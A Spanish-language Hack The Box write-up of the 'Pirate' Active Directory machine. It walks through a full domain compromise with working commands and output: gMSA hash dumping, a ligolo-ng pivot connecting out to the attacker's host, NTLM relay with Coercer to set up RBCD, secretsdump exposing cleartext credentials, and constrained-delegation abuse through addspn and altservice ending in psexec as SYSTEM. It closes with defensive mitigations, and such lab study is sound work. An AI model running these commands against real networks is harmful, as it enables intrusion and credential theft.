---
title: "Pirate"
description: "Writeup de Pirate - Hack The Box - Dificultad: Hard"
sidebar:
  badge:
    text: Hard
    variant: danger
tags:
  - htb
  - windows
  - hard
  - active-directory
  - kerberos
  - gmsa
  - bloodhound
  - kerberoast
  - ligolo-ng
  - pivoting
  - ntlm-relay
  - rbcd
  - petitpotam
  - coercer
  - constrained-delegation
  - s4u2proxy
  - altservice
  - secretsdump
  - dcsync
  - psexec
---
# 🖥️ Pirate
> 📅 Fecha: 2026-05-18
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows Server 2019 (Build 17763.8385)
> 🎚️ Dificultad: Hard
> 🏆 Puntos: 1105
> 🌐 IP: `10.129.36.45` (DC01) — `192.168.100.2` (WEB01, interno)
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (gMSA → WinRM)](#-explotación-inicial-gmsa--winrm)
- [Pivote a WEB01 con Ligolo-NG](#-pivote-a-web01-con-ligolo-ng)
- [Escalada Lateral: NTLM Relay → RBCD → user flag](#-escalada-lateral-ntlm-relay--rbcd--user-flag)
- [Escalada de Privilegios: constrained delegation altservice trick](#-escalada-de-privilegios-constrained-delegation-altservice-trick)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
Pirate es un entorno **Active Directory Hard** que encadena seis técnicas distintas: lectura de **gMSA** (porque la cuenta inicial pertenece a `Domain Secure Servers`), descubrimiento de una **red interna oculta** (segundo NIC del DC en `192.168.100.0/24`), pivot con **ligolo-ng**, **NTLM relay RBCD** contra WEB01 (SMB signing **no requerido**), coerción con **Coercer (MS-EFSRPC)**, y abuso de **constrained delegation con el truco de altservice + addspn** para saltar de WEB01 al DC.

Punto de partida: `pentest:p3nt3st2025!&`. La cuenta puede leer la contraseña del gMSA `gMSA_ADCS_prod$`. Una sesión WinRM en el DC revela un segundo NIC con `192.168.100.0/24` (WEB01 oculto detrás). Tunelizando con ligolo descubrimos que **WEB01 tiene SMB signing opcional** — vector clásico de relay. Levantamos `ntlmrelayx --delegate-access` contra LDAP del DC y disparamos coerción con `Coercer`; WEB01$ se autentica al atacante, ntlmrelayx lo relaya y configura **RBCD** dando a un computer account nuevo (`ECOSDUNT$`) la capacidad de impersonar a cualquier usuario sobre WEB01. Con S4U2Proxy nos hacemos **Administrator del WEB01** → user flag + `secretsdump` que filtra la contraseña en claro de `a.white` vía `DefaultPassword` de LSA.

Con `a.white` cambiamos la contraseña de `a.white_adm` (tiene `WRITE` sobre él). `a.white_adm` tiene **constrained delegation** configurada y `WRITE` sobre `DC01$`. Usamos `addspn` para registrar `HTTP/WEB01.pirate.htb` en `DC01$` y luego `getST` con `-altservice CIFS/DC01.pirate.htb`: la KDC nos da un ticket cifrado con la clave de `DC01$` (porque el SPN ahora está allí), y al renombrarlo a CIFS el servicio SMB del DC lo acepta. **psexec** → SYSTEM en el DC → root.txt.

| Campo | Valor |
|-------|-------|
| Puntos débiles | `Domain Secure Servers` pudiendo leer gMSA, WEB01 sin SMB signing, MS-EFSRPC sin parchear, constrained delegation explotable vía altservice trick + addspn |
| CVEs | N/A (cadena de misconfiguraciones — PetitPotam/MS-EFSRPC relacionado) |
| Herramientas | nmap, bloodhound-python, impacket suite, gMSADumper, bloodyAD, Certipy, Coercer, ligolo-ng, Evil-WinRM, addspn (krbrelayx), ntpdate |
| Tiempo total | *ver tus notas* |
---
## 🔍 Reconocimiento
### Sincronización de reloj y hosts
Cualquier operación Kerberos requiere que el cliente esté sincronizado con el KDC (tolerancia por defecto: 5 minutos). El skew aquí es de 7 horas, así que primero ajusto:
```bash
echo "10.129.36.45 DC01.pirate.htb pirate.htb" | sudo tee -a /etc/hosts
sudo ntpdate 10.129.36.45
```
```text
10.129.36.45 DC01.pirate.htb pirate.htb
2026-05-18 20:18:28.439303 (-0400) +25199.646283 +/- 0.077211 10.129.36.45 s1 no-leap
CLOCK: time stepped by 25199.646283
```

### Escaneo de puertos (nmap)
```bash
sudo nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN scan_dc01.txt 10.129.36.45
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 12:58 -0400
Nmap scan report for 10.129.36.45
Host is up (0.15s latency).
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb)
| ssl-cert: Subject: commonName=DC01.pirate.htb
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
Nmap done: 1 IP address (1 host up) scanned in 289.12 seconds
```
> 💡 **Análisis:** DC clásico Windows Server 2019. **SMB signing required** en el DC descarta relay clásico SMB→SMB hacia él, pero esto no descarta relay hacia LDAP (que es lo que vamos a hacer más tarde). Sospechoso que solo veamos un host — en máquinas Hard suele haber red interna oculta detrás. Hay que entrar primero y mirar adapters de red.
---
## 🗂️ Enumeración
### BloodHound como pentest
```bash
bloodhound-python -u pentest -p 'p3nt3st2025!&' -d pirate.htb -ns 10.129.36.45 -c All --zip
```
```text
INFO: Found AD domain: pirate.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 4 computers
INFO: Done in 00M 34S
INFO: Compressing output into 20260518131044_bloodhound.zip
```
> 💡 **Análisis:** **4 computers** en el dominio (DC01, WEB01, EXCH01, MS01) — pero nmap solo veía DC01. Confirmación de que hay red interna. En el grafo destaca `a.white_adm` como **kerberoasteable con delegación constrained**, y el grupo `Domain Secure Servers` con permisos especiales (suele ser quien puede leer gMSAs).

### Kerberoast targeting `N.Thompson`... err, `a.white_adm`
```bash
impacket-GetUserSPNs pirate.htb/'pentest:p3nt3st2025!&' -dc-ip 10.129.36.45 -request -outputfile tgs_hashes.txt
```
```text
ServicePrincipalName  Name         MemberOf                         PasswordLastSet              LastLogon                    Delegation
--------------------  -----------  -------------------------------  ---------------------------  ---------------------------  -----------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-15 20:36:34.388000   2025-06-09 12:03:37.380258   constrained
```
> 💡 **Análisis:** `a.white_adm` tiene SPN `ADFS/a.white` y **constrained delegation activada**. El hash TGS se obtiene pero (spoiler) no cracking con rockyou — la cuenta tiene contraseña fuerte. Necesitamos otra vía para conseguir credenciales suyas; la conseguiremos por **reset desde a.white** más adelante.

### gMSA password dump
La cuenta `pentest` está en el grupo `Domain Secure Servers`, que tiene permisos de lectura sobre el atributo `msDS-ManagedPassword` de las gMSAs:
```bash
python3 gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k
```
```text
Users or groups who can read password for gMSA_ADCS_prod$:
 > Domain Secure Servers
gMSA_ADCS_prod$:::2b8849da91d5206b9d1d1dcb44467089
gMSA_ADCS_prod$:aes256-cts-hmac-sha1-96:fd351eb0e51a3980570d99473a9ea999c6d59dd6ed3634788a125bc1e09d0e12

Users or groups who can read password for gMSA_ADFS_prod$:
 > Domain Secure Servers
gMSA_ADFS_prod$:::76754c94319e3a7dc07ba09aa79028ee
```
> 💡 **Análisis:** **Hash NT de `gMSA_ADCS_prod$` = `2b8849da91d5206b9d1d1dcb44467089`**. Las gMSAs (Group Managed Service Accounts) rotan automáticamente cada 30 días con entropía de 240 bits → no se crackea con wordlist. Pero si puedes **leerla**, el hash es directamente usable.
---
## 🚪 Explotación Inicial (gMSA → WinRM)
### TGT para la gMSA y acceso WinRM
```bash
impacket-getTGT 'pirate.htb/gMSA_ADCS_prod$' -hashes :2b8849da91d5206b9d1d1dcb44467089 -dc-ip 10.129.36.45
export KRB5CCNAME=$(pwd)/gMSA_ADCS_prod\$.ccache
evil-winrm -i 10.129.36.45 -u 'gMSA_ADCS_prod$' -H 2b8849da91d5206b9d1d1dcb44467089
```
```text
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop>
```

### Camino abandonado: Certipy → ADCS sin templates vulnerables
```bash
certipy-ad find -u 'gMSA_ADCS_prod$@pirate.htb' -hashes :2b8849da91d5206b9d1d1dcb44467089 -dc-ip 10.129.36.45 -vulnerable
```
```text
[*] Found 34 certificate templates
[*] Found 12 enabled certificate templates
[*] Saving JSON output to '20260518211757_Certipy.json'
```
> 💡 **Error cometido:** El nombre del gMSA (`ADCS_prod`) sugería que estaba relacionado con AD Certificate Services y por ahí venía la solución. Pero `certipy find -vulnerable` no encontró templates explotables (ESC1-ESC11). Vuelta atrás y a buscar otro vector.

### Descubrimiento del segundo NIC
```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> ipconfig
```
```text
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0

Ethernet adapter Ethernet0 2:
   IPv4 Address. . . . . . . . . . . : 10.129.36.45
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```
> 💡 **Análisis:** **Switch01** apunta a un virtual switch interno (Hyper-V) con red `192.168.100.0/24`. Esto es exactamente la red oculta que sospechábamos.

```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> arp -a
```
```text
Interface: 192.168.100.1 --- 0x8
  192.168.100.2    00-15-5d-0b-d0-02    dynamic
```
> 💡 **Análisis:** WEB01 vive en `192.168.100.2`. La MAC `00-15-5D-*` es Hyper-V virtual switch — confirma que es una VM en el mismo host. Necesitamos tunel para alcanzarlo desde el atacante.
---
## 🌉 Pivote a WEB01 con Ligolo-NG
### Setup del proxy y el túnel
**Atacante — proxy:**
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

**Víctima (DC01) — subir y conectar el agent:**
```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> .\agent.exe -connect 10.10.15.228:11601 -ignore-cert
```
```text
time="2026-05-18T18:54:59-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-05-18T18:54:59-07:00" level=info msg="Connection established" addr="10.10.15.228:11601"
```

**Atacante — añadir ruta hacia la red interna:**
```bash
sudo ip route add 192.168.100.0/24 dev ligolo
```

### Verificación + nmap de WEB01 a través del túnel
```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN web01_scan.txt 192.168.100.2
```
```text
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  https?
445/tcp   open  microsoft-ds?
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0
[...]
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```
> 💡 **Análisis crítico:** **SMB signing `enabled but NOT required`** en WEB01 (al contrario que en DC01). Esto habilita **NTLM relay** sobre SMB hacia este host, o usarlo como origen de relay hacia LDAP del DC. El segundo es lo que vamos a hacer.
---
## 🔄 Escalada Lateral: NTLM Relay → RBCD → user flag
### Plan
El objetivo: forzar a `WEB01$` (la computer account de WEB01) a autenticarse contra nuestro listener; relayar esa auth contra LDAP de DC01 con `--delegate-access` para escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` (**RBCD**) sobre `WEB01$`, dando a un computer account nuevo (creado por ntlmrelayx) permisos S4U2Proxy.

### Levantar ntlmrelayx
```bash
impacket-ntlmrelayx -t ldap://10.129.36.45 --delegate-access --remove-mic -smb2support
```
```text
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up RPC Server on port 135
[*] Multirelay disabled
[*] Servers started, waiting for connections
```

### Coerción de WEB01 vía Coercer (MS-EFSRPC)
```bash
python3 Coercer.py coerce -l 10.10.15.228 -t 192.168.100.2 \
  -u 'gMSA_ADCS_prod$' \
  --hashes :2b8849da91d5206b9d1d1dcb44467089 --always-continue
```
```text
[info] Starting coerce mode
[info] Scanning target 192.168.100.2
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [>] MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.15.228\...')
[+] SMB named pipe '\PIPE\lsass' is accessible!
[+] SMB named pipe '\PIPE\netlogon' is accessible!
```

### Resultado del relay
En la consola de `ntlmrelayx`:
```text
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.36.45 against ldap://10.129.36.45 SUCCEED [2]
[*] ldap://PIRATE/WEB01$@10.129.36.45 [2] -> Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] ldap://PIRATE/WEB01$@10.129.36.45 [2] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldap://PIRATE/WEB01$@10.129.36.45 [2] -> Adding new computer with username: ECOSDUNT$ and password: /IgfaM:k#f+T<PC result: OK
[*] ldap://PIRATE/WEB01$@10.129.36.45 [2] -> Delegation rights modified succesfully!
[*] ldap://PIRATE/WEB01$@10.129.36.45 [2] -> ECOSDUNT$ can now impersonate users on WEB01$ via S4U2Proxy
```
> 💡 **Análisis:** ntlmrelayx hizo en una sola operación:
> 1. Crear un computer account nuevo `ECOSDUNT$` con password `/IgfaM:k#f+T<PC`.
> 2. Escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en `WEB01$` añadiendo el SID de `ECOSDUNT$`.
>
> Resultado: `ECOSDUNT$` puede pedir tickets S4U2Self+S4U2Proxy para cualquier usuario contra cualquier servicio de `WEB01$`. Esto incluye `Administrator` → `CIFS/WEB01`.

### S4U2Proxy como Administrator sobre WEB01
```bash
impacket-getST 'pirate.htb/ECOSDUNT$:/IgfaM:k#f+T<PC' \
  -dc-ip 10.129.36.45 \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate Administrator
```
```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```
```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

### psexec como Administrator en WEB01 → user.txt
```bash
impacket-psexec -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```
```text
[*] Requesting shares on WEB01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file DeQOgjMs.exe
[*] Opening SVCManager on WEB01.pirate.htb.....
[*] Starting service qiVK.....
Microsoft Windows [Version 10.0.17763.8385]
C:\WINDOWS\system32>

C:\Users\a.white\Desktop> type user.txt
[user flag]
```
📸 *Captura: shell SYSTEM en WEB01 con lectura de `user.txt`.*
---
## 🚀 Escalada de Privilegios: constrained delegation altservice trick
### Secretsdump en WEB01 → credenciales en claro de `a.white`
```bash
impacket-secretsdump -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```
```text
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
[...]
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644:
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39:
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
[*] NL$KM
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9...
```
> 💡 **Análisis crítico:** El secreto **`DefaultPassword`** de LSA contiene la contraseña en claro de un usuario configurado para auto-login en WEB01: `PIRATE\a.white:E2nvAOKSz5Xz2MJu`. Esto es un anti-patrón clásico — alguien configuró `winlogon` con AutoAdminLogon y la password queda en LSA.

### Verificar permisos de a.white
```bash
bloodyAD --host 10.129.36.45 -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' get writable
```
```text
distinguishedName: CN=Angela W. ADM,CN=Users,DC=pirate,DC=htb
permission: WRITE
distinguishedName: CN=Angela White,CN=Users,DC=pirate,DC=htb
permission: WRITE
```
> 💡 **Análisis:** `a.white` tiene `WRITE` sobre `a.white_adm` (Angela W. ADM). Esto permite **resetear su password** sin necesidad de crackear el TGS que sacamos al principio.

### Reset de password de a.white_adm
```bash
bloodyAD --host 10.129.36.45 -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  set password 'CN=Angela W. ADM,CN=Users,DC=pirate,DC=htb' 'NewPassword123!'
```
```text
[+] Password changed successfully!
```

### Verificar los privilegios extra de a.white_adm
```bash
bloodyAD --host 10.129.36.45 -u 'a.white_adm' -p 'NewPassword123!' get writable
```
```text
distinguishedName: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
permission: WRITE
distinguishedName: CN=WEB01,CN=Computers,DC=pirate,DC=htb
permission: WRITE
distinguishedName: CN=MS01,CN=Computers,DC=pirate,DC=htb
permission: WRITE
distinguishedName: CN=EXCH01,CN=Computers,DC=pirate,DC=htb
permission: WRITE
```
> 💡 **Análisis explosivo:** `a.white_adm` tiene **`WRITE` sobre TODAS las computer accounts del dominio**, incluido **`DC01$`**. Esto, combinado con su **constrained delegation**, permite el ataque final.

### El truco: addspn + altservice
**Teoría rápida.** `a.white_adm` tiene constrained delegation a un servicio (típicamente `HTTP/WEB01.pirate.htb`). El KDC, al hacer S4U2Proxy, comprueba que el SPN solicitado está en `msDS-AllowedToDelegateTo` y devuelve un ticket cifrado con la clave del computer account que **posee ese SPN**.

Si añadimos `HTTP/WEB01.pirate.htb` como SPN del computer account `DC01$`, el ticket sale cifrado con la clave de `DC01$`. Luego `getST -altservice` reescribe el nombre del servicio en el ticket (de HTTP a CIFS) sin cambiar la clave. El servicio `CIFS/DC01.pirate.htb` corre bajo la misma cuenta `DC01$`, así que **decodifica el ticket con su clave** y lo acepta como válido. Resultado: ticket de Administrator para CIFS/DC01.

### Añadir el SPN al DC1$
```bash
python3 addspn.py -u 'pirate.htb\a.white_adm' -p 'NewPassword123!' \
  -s 'HTTP/WEB01.pirate.htb' \
  -t 'DC01$' \
  dc01.pirate.htb
```
```text
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

### S4U2Proxy con altservice
```bash
impacket-getST 'pirate.htb/a.white_adm:NewPassword123!' \
  -spn 'http/WEB01.pirate.htb' \
  -impersonate Administrator \
  -altservice 'CIFS/DC01.pirate.htb' \
  -dc-ip 10.129.36.45
```
```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```
```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

### psexec contra el DC → root.txt
```bash
impacket-psexec -k -no-pass DC01.pirate.htb
```
```text
[*] Requesting shares on DC01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file YDsVteDz.exe
[*] Opening SVCManager on DC01.pirate.htb.....
[*] Starting service iUda.....
Microsoft Windows [Version 10.0.17763.8385]
C:\Windows\system32>

C:\Users\Administrator\Desktop> type root.txt
[root flag]
```
📸 *Captura: shell SYSTEM en DC01 con lectura de `root.txt`.*
---
## 🏁 Flags
| Flag | Hash |
|------|------|
| user.txt (WEB01) | `[user flag]` |
| root.txt (DC01) | `[root flag]` |
---
## 🕸️ Cadena de Ataque
```text
1. pentest:p3nt3st2025!& + ntpdate (skew 7h)
        ↓
2. BloodHound → a.white_adm kerberoasteable + constrained, pentest ∈ Domain Secure Servers
        ↓
3. gMSADumper → gMSA_ADCS_prod$ NT hash
        ↓ (ADCS no vulnerable → camino abandonado)
4. WinRM como gMSA_ADCS_prod$ → ipconfig revela 192.168.100.0/24, arp ve WEB01
        ↓
5. Ligolo-NG → tun ligolo + ruta → acceso a WEB01:192.168.100.2
        ↓
6. nmap WEB01 → SMB signing NOT required
        ↓
7. ntlmrelayx --delegate-access apuntando a LDAP del DC
        ↓
8. Coercer (MS-EFSR) coerciona WEB01$ → ntlmrelayx captura auth
        ↓
9. RBCD: ECOSDUNT$ creado con S4U2Proxy sobre WEB01$
        ↓
10. getST + psexec → SYSTEM en WEB01 → user.txt
        ↓
11. secretsdump WEB01 → LSA DefaultPassword: a.white:E2nvAOKSz5Xz2MJu
        ↓
12. bloodyAD: a.white tiene WRITE sobre a.white_adm → reset password
        ↓
13. a.white_adm tiene WRITE sobre DC01$ → addspn HTTP/WEB01.pirate.htb → DC01$
        ↓
14. getST -altservice CIFS/DC01 (ticket cifrado con clave de DC01$)
        ↓
15. psexec con ticket → SYSTEM en DC01 → root.txt
```
---
## 🎓 Lecciones Aprendidas
- **El nombre de una gMSA puede ser un señuelo.** `gMSA_ADCS_prod$` sugería ADCS exploitation; perdí tiempo con Certipy antes de probar simplemente WinRM con el hash y mirar el sistema. **Primer pivote siempre: ¿qué puedo hacer YO con esta credencial directamente?**
- **`Domain Secure Servers` y otros grupos custom con permisos sobre gMSAs son objetivos VIP.** En BloodHound, buscar siempre quién está en grupos cuyo nombre incluya "secure", "service accounts", "managed", "tier 0".
- **`ipconfig` + `arp -a` antes que nada en cualquier shell Windows.** Las máquinas Hard suelen ocultar máquinas detrás de un segundo NIC. nmap del exterior no las verá.
- **SMB signing `enabled but not required`** = NTLM relay viable hacia ese host (o desde ese host como origen del relay). El "but not required" es la palabra clave.
- **`--delegate-access` de ntlmrelayx automatiza RBCD de punta a punta.** Crea computer account + escribe `msDS-AllowedToActOnBehalfOfOtherIdentity` en un solo paso. Memorizar esta opción.
- **Coercer es el sustituto generalista de PetitPotam.** Prueba MS-EFSR, MS-RPRN, MS-DFSNM, MS-FSRVP, etc. automáticamente y deja el resumen. Para cuando una técnica esté parcheada, otra suele seguir.
- **`DefaultPassword` en LSA** = legacy autologin. Cualquier estación con AutoAdminLogon configurado tiene la password de un user del dominio en claro accesible para SYSTEM.
- **El truco constrained delegation + addspn + altservice** es de los ataques más limpios contra DCs cuando tienes WRITE sobre el computer account. La defensa correcta es **deshabilitar protocol transition** y usar **Authentication Policy Silos**.
- **Cuando un usuario tiene constrained delegation, su WRITE sobre `DC01$` es game over.** En auditoría, buscar siempre: cuentas con `userAccountControl` que incluya `TRUSTED_TO_AUTH_FOR_DELEGATION` (`0x1000000`) + permisos de escritura sobre objetos de máquina críticos.

### Mitigaciones (lado defensivo)
1. **Restringir membresía de `Domain Secure Servers`** (o equivalente) a cuentas estrictamente de servicio. Auditar quién puede leer cada `msDS-ManagedPassword`.
2. **SMB signing requerido en TODOS los hosts**, no solo en los DCs. La diferencia entre "enabled" y "required" cuesta toda la red.
3. **Aplicar parches PetitPotam/MS-EFSRPC** (KB5005413) + habilitar **EPA en LDAP/LDAPS** y deshabilitar NTLM saliente vía GPO.
4. **No usar AutoAdminLogon en hosts joineados al dominio.** Si es estrictamente necesario, usar cuentas locales sin privilegios de dominio.
5. **Authentication Policy Silos / Protected Users** para todas las cuentas administrativas: deshabilita NTLM, deshabilita delegation, fuerza Kerberos AES.
6. **Auditar cuentas con constrained delegation** (`msDS-AllowedToDelegateTo` no vacío) y restringir sus `WRITE` sobre computer accounts. La combinación es letal.
---
## 📚 Referencias
- [HackTricks - gMSA exploitation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/gmsa)
- [HackTricks - RBCD attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
- [HackTricks - Constrained delegation + altservice](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)
- [Elad Shamir - Wagging the Dog (S4U abuse)](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [PetitPotam / MS-EFSRPC coercion](https://github.com/topotam/PetitPotam)
- [Coercer (Podalirius)](https://github.com/p0dalirius/Coercer)
- [ligolo-ng - modern reverse tunnel](https://github.com/nicocha30/ligolo-ng)
- [krbrelayx + addspn (dirkjanm)](https://github.com/dirkjanm/krbrelayx)
- [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [Impacket](https://github.com/fortra/impacket)